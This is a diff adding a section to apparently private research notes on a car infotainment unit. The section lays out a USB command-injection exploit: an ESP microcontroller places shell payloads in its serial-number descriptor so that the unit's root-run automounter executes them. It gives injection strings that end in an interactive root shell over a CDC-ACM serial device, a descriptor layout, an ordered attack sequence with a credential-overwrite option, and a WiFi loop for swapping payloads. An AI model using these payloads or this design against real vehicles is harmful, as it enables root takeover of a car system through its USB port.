@@ -89,6 +89,71 @@ the authentic image. That exercises the real `usb-automount`, real udev, real ke
 the real payload path before the car is involved. The only thing untested is the
 physical port and its power.
 
+## Design for a live, controllable ESP (revised)
+
+The owner can reprogram the ESP while it is plugged in, which changes this from a blind
+one-shot into an interactive channel. Two things make that possible.
+
+### 1. The payload can be an interactive shell, not just a command
+
+The command is backgrounded but the payload ends with `;#`, and the `#` comments out the
+trailing `&` — so the injected command becomes `system()`'s foreground child. That means a
+shell payload works:
+
+```
+;/bin/sh</dev/ttyACM0>/dev/ttyACM0${IFS}2>&1;#      46 chars, charset-clean
+```
+
+Assembled, the firmware builds:
+
+```
+/usr/bin/go-mtpfs --dev ;/bin/sh</dev/ttyACM0>/dev/ttyACM0${IFS}2>&1;# /media/mtp/... &
+```
+
+which bash parses as `/bin/sh < /dev/ttyACM0 > /dev/ttyACM0 2>&1` — **an interactive root
+shell over USB**, with everything after it commented out.
+
+### 2. There is a usable feedback channel: CDC-ACM
+
+`CONFIG_USB_ACM=m` is in the kernel, and udev/`modprobe` will load it for the interface, giving
+`/dev/ttyACM0`. This is better than using a mass-storage mailbox, because the automounter's
+filesystem strings are only `ntfs`, `exfat` and `ext4` — a FAT volume from a microcontroller is
+not obviously in its whitelist, whereas the ACM device needs no mount at all.
+
+Fallbacks if `/dev/ttyACM0` does not appear: `/dev/ttyUSB0` (generic serial, also modular), or
+an exfat/ext4 mailbox.
+
+### Composite descriptor
+
+| Interface | Class | Purpose |
+| --- | --- | --- |
+| vendor-specific | `ff/ff/00` | satisfies the MTP branch test at `0x44c3` |
+| CDC-ACM | `02/02/01` (+ data iface) | the data channel, `/dev/ttyACM0` |
+| `iSerialNumber` | — | the payload itself |
+
+Because descriptors are fixed at enumeration, **changing the payload means re-enumerating** —
+which TinyUSB can do in software. That is the whole iteration loop: push a new payload over
+WiFi, re-enumerate, and the unit runs it as root. No unplugging, and no access to the car beyond
+the USB port.
+
+### Practical order
+
+1. `;id>/dev/ttyACM0;#` — confirms both the injection and the ACM channel in one step.
+2. `;ls${IFS}/dev/tty*>/dev/ttyACM0;#` — locate the right device node if `ttyACM0` is absent.
+   Note the earlier draft of this had a stray space after `>`, which the charset filter would
+   have turned into `_`; the corrected form above has none.
+3. `;/bin/sh</dev/ttyACM0>/dev/ttyACM0${IFS}2>&1;#` — interactive root.
+4. Optionally the credential overwrite, if a shell over USB is not wanted.
+
+### Caveats
+
+- `usb_serial`/`usb_acm` are modules; if the unit does not autoload them the node will not
+  appear, which is why step 2 exists.
+- The MTP branch fires on the USB **device** add event; the automount service must already be
+  running. Inserting during early boot may miss it.
+- The shell inherits the automounter's environment and blocks it while open. That is acceptable
+  for a takeover but means the automounter stops responding afterwards.
+
 ## Vector B — media parsing as root (V-007). No known bug.
 
 Media scanning, indexing, playback and metadata extraction all run as uid 0 with no
